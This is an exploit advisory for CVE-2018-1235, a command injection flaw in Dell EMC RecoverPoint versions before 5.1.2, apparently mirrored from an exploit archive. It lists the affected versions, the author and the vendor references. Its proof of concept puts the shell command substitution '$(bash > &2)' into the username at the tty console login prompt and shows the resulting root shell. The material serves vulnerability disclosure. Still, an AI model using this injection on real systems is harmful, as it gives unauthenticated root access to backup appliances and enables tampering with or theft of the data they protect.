# Exploit Title: Dell EMC RecoverPoint < 5.1.2 - Local Root Command Execution
# Exploit Author: Paul Taylor
# Version: All versions before RP 5.1.2, and all versions before RP4VMs 5.1.1.3
# Vendor KB: https://support.emc.com/kb/521234
# Github: https://github.com/bao7uo/dell-emc_recoverpoint
# Website: https://www.foregenix.com/blog/foregenix-identify-multiple-dellemc-recoverpoint-zero-day-vulnerabilities
# Tested on: RP4VMs 5.1.1.2, RP 5.1.SP1.P2
# CVE: CVE-2018-1235
   
# 1. Description
# An OS command injection vulnerability exists in the mechanism which processes usernames 
# which are presented for authentication, allowing unauthenticated root access 
# via tty console login.
   
# 2. Proof of Concept
# Inject into local tty console login prompt
  
recoverpoint login: $(bash > &2)
root@recoverpoint:/# id
uid=0(root) gid=0(root) groups=0(root)
root@recoverpoint:/#
 
#  0day.today [2023-02-20]  #